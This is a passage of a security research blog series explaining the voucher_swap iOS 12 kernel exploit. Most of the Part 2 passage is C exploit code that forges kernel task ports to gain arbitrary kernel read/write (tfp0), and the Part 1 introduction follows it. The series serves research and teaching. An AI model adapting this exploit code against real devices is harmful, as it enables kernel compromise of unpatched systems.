    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"mach_msg"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not stash our port in a message to the base port"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="c1">// Read the address of the kmsg.</span>
    	<span class="kt">uint64_t</span> <span class="n">base_port_imq_messages</span> <span class="o">=</span> <span class="n">base_port_address</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">,</span> <span class="n">imq_messages</span><span class="p">);</span>
    	<span class="kt">uint64_t</span> <span class="n">kmsg</span> <span class="o">=</span> <span class="n">stage1_read64</span><span class="p">(</span><span class="n">base_port_imq_messages</span><span class="p">);</span>
    	<span class="c1">// Read the message's msgh_local_port field to get the address of the target port.</span>
    	<span class="c1">// +-----------------+---+--------+---------+</span>
    	<span class="c1">// | struct ipc_kmsg |   | header | trailer |</span>
    	<span class="c1">// +-----------------+---+--------+---------+</span>
    	<span class="kt">uint64_t</span> <span class="n">msgh_local_port</span> <span class="o">=</span> <span class="n">kmsg</span> <span class="o">+</span> <span class="n">ipc_kmsg_size_for_message_size</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>
    		<span class="o">-</span> <span class="n">MAX_TRAILER_SIZE</span> <span class="o">-</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">mach_msg_header_t</span><span class="p">)</span> <span class="o">+</span> <span class="n">MACH_HEADER_SIZE_DELTA</span><span class="p">)</span>
    		<span class="o">+</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">));</span>
    	<span class="kt">uint64_t</span> <span class="n">port_address</span> <span class="o">=</span> <span class="n">stage1_read64</span><span class="p">(</span><span class="n">msgh_local_port</span><span class="p">);</span>
    	<span class="c1">// Discard the message.</span>
    	<span class="n">port_discard_messages</span><span class="p">(</span><span class="n">base_port</span><span class="p">);</span>
    	<span class="k">return</span> <span class="n">port_address</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/*
     * stage1_read32
     *
     * Description:
     * 	Read a 32-bit value from kernel memory using our fake port.
     *
     * 	This primitive requires that we know the address of the pipe buffer containing our port.
     */</span>
    <span class="k">static</span> <span class="kt">uint32_t</span>
    <span class="nf">stage1_read32</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">address</span><span class="p">)</span> <span class="p">{</span>
    	<span class="c1">// Do a read to make the pipe available for a write.</span>
    	<span class="n">read_pipe</span><span class="p">();</span>
    	<span class="c1">// Create our fake task. The task's proc's p_pid field overlaps with the address we want to</span>
    	<span class="c1">// read.</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_proc_address</span> <span class="o">=</span> <span class="n">address</span> <span class="o">-</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">p_pid</span><span class="p">);</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_task_address</span> <span class="o">=</span> <span class="n">pipe_buffer_address</span> <span class="o">+</span> <span class="n">fake_task_offset</span><span class="p">;</span>
    	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fake_task</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">pipe_buffer</span> <span class="o">+</span> <span class="n">fake_task_offset</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_task</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="n">ref_count</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_task</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="n">bsd_info</span><span class="p">,</span>  <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">fake_proc_address</span><span class="p">;</span>
    	<span class="c1">// Initialize the port as a fake task port pointing to our fake task.</span>
    	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fake_port_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">pipe_buffer</span> <span class="o">+</span> <span class="n">fake_port_offset</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_bits</span><span class="p">,</span>    <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">io_makebits</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">IOT_PORT</span><span class="p">,</span> <span class="n">IKOT_TASK</span><span class="p">);</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_kobject</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">fake_task_address</span><span class="p">;</span>
    	<span class="c1">// Write our buffer to kernel memory.</span>
    	<span class="n">write_pipe</span><span class="p">();</span>
    	<span class="c1">// Now use pid_for_task() to read our value.</span>
    	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    	<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">pid_for_task</span><span class="p">(</span><span class="n">fake_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"pid_for_task"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not read kernel memory in stage %d using %s"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"pid_for_task"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="k">return</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="n">pid</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<h4 id="step-22-get-the-address-of-the-host-port">Step 22: Get the address of the Host port</h4>

<p>We need to get the host port address first using which we can find the <strong>ipc_space_kernel</strong> in later steps. In order to achieve a full kernel read/write, we need to find kernel <strong>vm_map</strong> and the kernel <strong>ipc_space</strong>. Since the <strong>ipc_space_kernel</strong> can be identified using the host port’s receiver field, it is essential to find the address of the host port.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 22\. Our next goal is to build a fake kernel_task port that allows us to read and write</span>
    	<span class="c1">// kernel memory with mach_vm_read()/mach_vm_write(). But in order to do that, we'll first</span>
    	<span class="c1">// need to get ipc_space_kernel and kernel_map. We'll use Ian's technique from multi_path</span>
    	<span class="c1">// for this.</span>
    	<span class="c1">//</span>
    	<span class="c1">// First things first, get the address of the host port.</span>
    	<span class="kt">uint64_t</span> <span class="n">host_port_address</span> <span class="o">=</span> <span class="n">stage1_find_port_address</span><span class="p">(</span><span class="n">host</span><span class="p">);</span></code></pre></figure>

<h4 id="step-23-get-ipc_space_kernel-from-the-host-ports-ip_receiver">Step 23: Get ipc_space_kernel from the host port’s ip_receiver</h4>

<p>Recall from Part 1 that the <strong>ipc_port</strong> struct has a receiver field which points to the ipc_space. We can read the <strong>ipc_space_kernel</strong> by reading the host ports <strong>ip_receiver</strong> field.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 23\. We can get ipc_space_kernel from the host port's ip_receiver.</span>
    	<span class="kt">uint64_t</span> <span class="n">host_port_ip_receiver</span> <span class="o">=</span> <span class="n">host_port_address</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_receiver</span><span class="p">);</span>
    	<span class="kt">uint64_t</span> <span class="n">ipc_space_kernel</span> <span class="o">=</span> <span class="n">stage1_read64</span><span class="p">(</span><span class="n">host_port_ip_receiver</span><span class="p">);</span></code></pre></figure>

<h4 id="step-24-get-the-address-of-the-kernel-task-port">Step 24: Get the address of the kernel task port</h4>

<p>The next step is to find the kernel <strong>vm_map</strong>, and to do that we can first find the kernel task port and from there onwards get the <strong>vm_map</strong> at a fixed offset. In the heap, the kernel task port would be near to the host port, so therefore we can iterate into that particular block as task ports and identify the kernel task port and subsequently get the kernel <strong>vm_map</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 24\. Now we'll iterate through all the ports in the host port's block to try and find the</span>
    	<span class="c1">// kernel task port, which will give us the address of the kernel task.</span>
    	<span class="n">kernel_task</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="kt">uint64_t</span> <span class="n">port_block</span> <span class="o">=</span> <span class="n">host_port_address</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    	<span class="n">iterate_ipc_ports</span><span class="p">(</span><span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">),</span> <span class="o">^</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">port_offset</span><span class="p">,</span> <span class="n">bool</span> <span class="o">*</span><span class="n">stop</span><span class="p">)</span> <span class="p">{</span>
    		<span class="kt">uint64_t</span> <span class="n">candidate_port</span> <span class="o">=</span> <span class="n">port_block</span> <span class="o">+</span> <span class="n">port_offset</span><span class="p">;</span>
    		<span class="n">bool</span> <span class="n">found</span> <span class="o">=</span> <span class="n">stage1_check_kernel_task_port</span><span class="p">(</span><span class="n">candidate_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kernel_task</span><span class="p">);</span>
    		<span class="o">*</span><span class="n">stop</span> <span class="o">=</span> <span class="n">found</span><span class="p">;</span>
    	<span class="p">});</span>
    	<span class="c1">// Make sure we got the kernel_task's address.</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kernel_task</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not find kernel_task port"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"kernel_task is at 0x%016llx"</span><span class="p">,</span> <span class="n">kernel_task</span><span class="p">);</span></code></pre></figure>

<p>The following function checks whether a port is a kernel task port or not. It first looks up the bits field to see if it is of type <strong>IKOT_TASK</strong> to identify whether it is a task port. It then reads the address pointed to by the <strong>kobject</strong> field which is the corresponding task, looks up the <strong>bsd_info</strong> field in that task to find the <strong>proc</strong> structure it is pointing to, and then reads the <strong>pid</strong> value. If it is <strong>0</strong> this means it is the kernel task port.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     * stage1_check_kernel_task_port
     *
     * Description:
     * 	Check if the given ipc_port is a task port for the kernel task.
     */</span>
    <span class="k">static</span> <span class="n">bool</span>
    <span class="nf">stage1_check_kernel_task_port</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">candidate_port</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">kernel_task_address</span><span class="p">)</span> <span class="p">{</span>
    	<span class="c1">// Check the ip_bits field.</span>
    	<span class="kt">uint32_t</span> <span class="n">ip_bits</span> <span class="o">=</span> <span class="n">stage1_read32</span><span class="p">(</span><span class="n">candidate_port</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_bits</span><span class="p">));</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">ip_bits</span> <span class="o">!=</span> <span class="n">io_makebits</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">IOT_PORT</span><span class="p">,</span> <span class="n">IKOT_TASK</span><span class="p">))</span> <span class="p">{</span>
    		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    	<span class="p">}</span>
    	<span class="c1">// This is a task port. Get the task.</span>
    	<span class="kt">uint64_t</span> <span class="n">task</span> <span class="o">=</span> <span class="n">stage1_read64</span><span class="p">(</span><span class="n">candidate_port</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_kobject</span><span class="p">));</span>
    	<span class="c1">// Now get the task's PID.</span>
    	<span class="kt">uint64_t</span> <span class="n">proc</span> <span class="o">=</span> <span class="n">stage1_read64</span><span class="p">(</span><span class="n">task</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">task</span><span class="p">,</span> <span class="n">bsd_info</span><span class="p">));</span>
    	<span class="kt">uint32_t</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">stage1_read32</span><span class="p">(</span><span class="n">proc</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">p_pid</span><span class="p">));</span>
    	<span class="c1">// The kernel task has pid 0.</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    	<span class="p">}</span>
    	<span class="c1">// Found it!</span>
    	<span class="o">*</span><span class="n">kernel_task_address</span> <span class="o">=</span> <span class="n">task</span><span class="p">;</span>
    	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<h4 id="step-25-get-the-address-of-the-vm_map">Step 25: Get the address of the vm_map</h4>

<p>Now that we have identified the kernel task port, we can read the <strong>vm_map</strong> since it is at a fixed offset.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 25\. Next we can use the kernel task to get the address of the kernel vm_map.</span>
    	<span class="kt">uint64_t</span> <span class="n">kernel_map</span> <span class="o">=</span> <span class="n">stage1_read64</span><span class="p">(</span><span class="n">kernel_task</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">task</span><span class="p">,</span> <span class="n">map</span><span class="p">));</span></code></pre></figure>

<h4 id="step-26-create-a-fake-kernel-task-port">Step 26: Create a fake kernel task port</h4>

<p>Now we can build a fake kernel task port, all of which is still within the pipe buffer.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 26\. Build a fake kernel task port that allows us to read and write kernel memory.</span>
    	<span class="n">stage2_init</span><span class="p">(</span><span class="n">ipc_space_kernel</span><span class="p">,</span> <span class="n">kernel_map</span><span class="p">);</span></code></pre></figure>

<p>The criteria for a fake kernel task port is that the fake task’s map field should point to the kernel <strong>vm_map</strong> and the receiver field should point to the <strong>ipc_space_kernel</strong>. This is acheived with the following 2 lines.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="n">FIELD</span><span class="p">(</span><span class="n">fake_task</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="n">map</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">kernel_map</span><span class="p">;</span>
    <span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_receiver</span><span class="p">,</span>   <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">ipc_space_kernel</span><span class="p">;</span></code></pre></figure>

<h4 id="step-27-create-a-fake-kernel-task-port">Step 27: Create a fake kernel task port</h4>

<p>Now that we have a fully functioning kernel task port and we can call the Mach APIs to read and write memory, it is time to build a more stable kernel task port. This time, memory is allocated via <strong>mach_vm_allocate</strong> and the kernel task port may be created even outside the pipe buffer.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 27\. Alright, now kernel_read() and kernel_write() should work, so let's build a safer</span>
    	<span class="c1">// kernel_task port. This also cleans up fake_port so that we (hopefully) won't panic on</span>
    	<span class="c1">// exit.</span>
    	<span class="kt">uint64_t</span> <span class="n">task_pointer</span> <span class="o">=</span> <span class="n">task_port_address</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_kobject</span><span class="p">);</span>
    	<span class="n">current_task</span> <span class="o">=</span> <span class="n">kernel_read64</span><span class="p">(</span><span class="n">task_pointer</span><span class="p">);</span>
    	<span class="n">stage3_init</span><span class="p">(</span><span class="n">ipc_space_kernel</span><span class="p">,</span> <span class="n">kernel_map</span><span class="p">);</span>

    <span class="cm">/*
     * stage3_init
     *
     * Description:
     * 	Initialize the stage 3 kernel read/write primitives. After this, it's safe to free all
     * 	other resources.
     *
     * 	TODO: In the future we should use mach_vm_remap() here to actually get a second copy of the
     * 	real kernel_task.
     */</span>
    <span class="k">static</span> <span class="n">bool</span>
    <span class="nf">stage3_init</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">ipc_space_kernel</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">kernel_map</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    	<span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="mh">0x800</span><span class="p">;</span>
    	<span class="c1">// Allocate some virtual memory.</span>
    	<span class="n">mach_vm_address_t</span> <span class="n">page</span><span class="p">;</span>
    	<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">mach_vm_allocate</span><span class="p">(</span><span class="n">fake_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">page</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">VM_FLAGS_ANYWHERE</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"mach_vm_allocate"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="k">goto</span> <span class="n">fail_0</span><span class="p">;</span>
    	<span class="p">}</span>
    	<span class="c1">// Build the contents we want.</span>
    	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">data</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">);</span>
    	<span class="n">build_fake_kernel_task</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ipc_space_kernel</span><span class="p">,</span> <span class="n">kernel_map</span><span class="p">);</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_port_address</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>
    	<span class="c1">// Copy the contents into the kernel.</span>
    	<span class="n">bool</span> <span class="n">ok</span> <span class="o">=</span> <span class="n">kernel_write</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ok</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not write fake kernel_task into kernel memory"</span><span class="p">);</span>
    		<span class="k">goto</span> <span class="n">fail_1</span><span class="p">;</span>
    	<span class="p">}</span>
    	<span class="c1">// Modify fake_port's ipc_entry so that it points to our new fake port.</span>
    	<span class="kt">uint64_t</span> <span class="n">ipc_entry</span><span class="p">;</span>
    	<span class="n">ok</span> <span class="o">=</span> <span class="n">kernel_ipc_port_lookup</span><span class="p">(</span><span class="n">current_task</span><span class="p">,</span> <span class="n">fake_port</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ipc_entry</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ok</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not look up the IPC entry for the fake port"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="n">kernel_write64</span><span class="p">(</span><span class="n">ipc_entry</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_entry</span><span class="p">,</span> <span class="n">ie_object</span><span class="p">),</span> <span class="n">fake_port_address</span><span class="p">);</span>
    	<span class="c1">// Clear ie_request to avoid a panic on termination.</span>
    	<span class="n">kernel_write32</span><span class="p">(</span><span class="n">ipc_entry</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_entry</span><span class="p">,</span> <span class="n">ie_request</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    	<span class="c1">// At this point fake_port has been officially donated to kernel_task_port.</span>
    	<span class="n">fake_port</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    	<span class="n">success</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
    <span class="nl">fail_1:</span>
    	<span class="n">free</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
    <span class="nl">fail_0:</span>
    	<span class="k">return</span> <span class="n">success</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<h4 id="step-28-clean-up-the-unneeded-resources">Step 28: Clean up the unneeded resources</h4>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 28\. We've corrupted a bunch of kernel state, so let's clean up our mess:</span>
    	<span class="c1">//   - base_port has an extra port reference.</span>
    	<span class="c1">//   - uaf_voucher_port needs to be destroyed.</span>
    	<span class="c1">//   - ip_requests needs to be deallocated.</span>
    	<span class="c1">//   - leaked_kmsgs need to be destroyed.</span>
    	<span class="n">clean_up</span><span class="p">(</span><span class="n">uaf_voucher_port</span><span class="p">,</span> <span class="n">ip_requests</span><span class="p">,</span> <span class="n">leaked_kmsgs</span><span class="p">,</span>
    			<span class="k">sizeof</span><span class="p">(</span><span class="n">leaked_kmsgs</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leaked_kmsgs</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span></code></pre></figure>

<h4 id="step-29-clean-up-some-more-unneeded-resources-and-now-we-have-a-stable-tfp0">Step 29: Clean up some more unneeded resources and now we have a stable tfp0</h4>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 29\. And finally, deallocate the remaining unneeded (but non-corrupted) resources.</span>
    	<span class="n">pipe_close</span><span class="p">(</span><span class="n">pipefds</span><span class="p">);</span>
    	<span class="n">free</span><span class="p">(</span><span class="n">pipe_buffer</span><span class="p">);</span>
    	<span class="n">mach_port_destroy</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">base_port</span><span class="p">);</span>

    	<span class="c1">// And that's it! Enjoy kernel read/write via kernel_task_port.</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"done! port 0x%x is tfp0"</span><span class="p">,</span> <span class="n">kernel_task_port</span><span class="p">);</span></code></pre></figure>

<p>All set, now we have acheived full kernel read/write.</p>

<h3 id="conclusion">Conclusion</h3>

<p>In this article, we looked at the voucher_swap() vulnerability discovered by <strong>@_bazad</strong> and explained the steps leading up to obtain tfp0 in iOS 12. In the next article, we will look at the <strong>Undecimus</strong> jailbreak and all the steps needed to successfully jailbreak an iOS device.</p>

<h3 id="references">References</h3>

<ol>
  <li>Project Zero Issue tracker - https://bugs.chromium.org/p/project-zero/issues/detail?id=1731</li>
  <li>iOS 10 - Kernel Heap Revisited - https://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf</li>
  <li>Mac OS X Internals: A Systems Approach - https://www.amazon.com/Mac-OS-Internals-Approach-paperback/dp/0134426541</li>
  <li>MacOS and iOS Internals, Volume III: Security &amp; Insecurity: https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535</li>
  <li>MacOS and iOS Internals, Volume III: Security &amp; Insecurity: https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535</li>
  <li>CanSecWest 2017 - Port(al) to the iOS Core - https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core</li>
</ol>]]></content><author><name>Prateek Gianchandani</name></author><category term="security" /><category term="ios" /><summary type="html"><![CDATA[In this article, we will get an in-depth look at the voucher_swap vulnerability and all the steps leading up to getting the kernel task port.]]></summary></entry><entry><title type="html">From zero to tfp0 - Part 1: Prologue</title><link href="/2020/06/01/from-zero-to-tfp0-part-1-prologue.html" rel="alternate" type="text/html" title="From zero to tfp0 - Part 1: Prologue" /><published>2020-06-01T00:35:00+00:00</published><updated>2020-06-01T00:35:00+00:00</updated><id>/2020/06/01/from-zero-to-tfp0-part-1-prologue</id><content type="html" xml:base="/2020/06/01/from-zero-to-tfp0-part-1-prologue.html"><![CDATA[<p>On Jan 22, 2019, Google Project Zero researcher <a href="https://twitter.com/_bazad">@_bazad</a> tweeted the following.</p>

<blockquote>
  <p>If you’re interested in bootstrapping iOS kernel security research (including the ability to forge PACs and call arbitrary kernel functions), keep an A12 research device on iOS 12.1.2.</p>

  <p>— Brandon Azad (@_bazad) <a href="https://twitter.com/_bazad/status/1087782723970785281?ref_src=twsrc%5Etfw">January 22, 2019</a></p>
</blockquote>

<p>It was a reference counting bug in MIG (Message Interface generator) generated code. The PoC included a code snippet that would trigger the bug and cause a kernel panic. This was followed later by a complete PoC that provided the Kernel task port (tfp0) to userland thereby enabling arbitrary kernel read and write.</p>

<!--more-->

<blockquote>
  <p>The A12, now with more kernel code execution; introducing voucher_swap: <a href="https://t.co/rVkwo50fgd">https://t.co/rVkwo50fgd</a></p>

  <p>— Brandon Azad (@_bazad) <a href="https://twitter.com/_bazad/status/1090312918422282241?ref_src=twsrc%5Etfw">January 29, 2019</a></p>
</blockquote>

<p>The bug was then used to develop a complete jailbreak for iOS 12 using various contributions from the community. This blog series is divided into three parts.</p>

<ol>
  <li>
    <p>Part 1 deals with iOS security basics, which are fundamental in understanding the next two parts. It discusses kernelcache analysis, Mach messaging, Mach Ports, MIG, Heap allocation basics, CoreTrust, PAC, etc and some popular exploitation techniques such as creating a fake kernel task port, task_for_pid() arbitrary kernel read, etc. If you are already aware of these techniques, you can skip to Part 2 directly. During Part 1, I will be giving references which will link to the other two parts which will further reiterate why these concepts are essential to understand.</p>
  </li>
  <li>
    <p>Part 2 will discuss the actual vulnerability and the whole exploitation steps leading up to the Kernel task port (tfp0).</p>
  </li>
  <li>
    <p>Part 3 will discuss the steps taken to achieve a jailbreak such as bypassing sandboxing, CoreTrust, enabling rootfs remount etc.</p>
  </li>
</ol>

<h2 id="downloadables">Downloadables</h2>

<p>Before we get started, you will need the following files to follow along.</p>

<ul>
  <li>A copy of the vulnerable xnu kernel - <a href="https://opensource.apple.com/tarballs/xnu/xnu-4903.221.2.tar.gz">xnu-4903.221.2</a></li>
  <li>The voucher_swap exploit code - <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=377026&amp;signed_aid=RWxVCY6jN3pZa8F0_0iOhg==">voucher_swap</a></li>
  <li>Latest version of the <a href="https://github.com/pwn20wndstuff/Undecimus">Undecimus</a> jailbreak</li>
  <li>The <a href="http://updates-http.cdn-apple.com/2018FallFCS/fullrestores/091-63070/11855120-AC8E-11E8-8110-D73611761120/iPhone_4.7_P3_12.0_16A366_Restore.ipsw">IPSW</a> for iOS12.0 for iPhone8</li>
  <li>Hopper, IDA Pro, Or Binary-Ninja, whichever reversing tool you prefer.</li>
  <li><strong>jtool2</strong></li>
</ul>

<h2 id="xnu-kernel">XNU Kernel</h2>

<p>The iOS Kernelcache comprises of the core kernel and it’s kernel extensions. The kernel code in itself is closed source; however, it is based on a fork of the open source XNU Kernel which is also used on Mac OS. The XNU kernel can be downloaded from opensource.apple.com.</p>

<p><img src="/images/1.png" alt="1" /></p>

<p>Since the last couple of years, Apple has been open sourcing the ARM specific code as well, that can be found under <strong>ifdef CONFIG_EMBEDDED</strong> statements. Apple however still decides to keep some implementations to itself.</p>

